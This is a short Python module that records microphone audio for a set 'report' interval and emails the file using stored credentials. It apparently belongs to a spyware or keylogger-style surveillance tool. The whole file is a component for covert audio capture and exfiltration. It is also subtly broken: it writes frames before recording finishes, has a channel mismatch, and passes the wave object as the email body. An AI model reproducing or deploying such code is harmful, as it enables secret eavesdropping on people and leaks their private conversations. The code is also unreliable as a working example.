# microphone_recorder.py
import wave
import sounddevice as sd
from config import Time_For_Report, EMAIL_ADDRESS, EMAIL_PASSWORD
from utils import send_mail

class MicrophoneRecorder:
    def __init__(self, append_log):
        self.append_log = append_log

    def record(self):
        fs = 44100
        seconds = Time_For_Report
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
